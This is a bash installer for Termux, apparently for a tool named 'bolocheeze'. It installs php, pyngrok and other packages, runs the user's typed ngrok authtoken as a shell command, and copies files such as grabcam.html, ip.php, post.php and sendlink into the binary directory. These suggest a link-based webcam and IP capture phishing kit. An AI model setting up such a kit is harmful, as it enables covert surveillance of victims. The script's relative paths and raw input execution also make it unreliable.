#!/bin/bash
trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
        sleep 2
        printf "\e[0m\n"
        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/haraprasadhota for more "
        printf "\e[0m\n"
        exit 1
}
clear

termux-setup-storage
apt install php -y
apt install wget -y
apt install python -y
apt install python-pip -y
pip install pyngrok
apt-get install ruby -y
gem install ruby
gem install lolcat
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Visit NgroK,\e[0m\e[1;77m Enter Your Authtoken Without ./ .  ...\e[0m\n" $Authtoken
read Authtoken
$Authtoken
chmod 700 *
mv bolocheeze.sh bolocheeze
mv bolocheeze data/data/com.termux/files/usr/bin
mv grabcam.html data/data/com.termux/files/usr/bin
mv jio data/data/com.termux/files/usr/bin
mv index.php data/data/com.termux/files/usr/bin
mv ip.php data/data/com.termux/files/usr/bin
mv template.php data/data/com.termux/files/usr/bin
mv post.php data/data/com.termux/files/usr/bin
mv index2.html data/data/com.termux/files/usr/bin
mv kk.jpg data/data/com.termux/files/usr/bin
mv sendlink data/data/com.termux/files/usr/bin
echo -e "\e[1;33m type Anywhere bolocheeze"
sleep 3
bolocheeze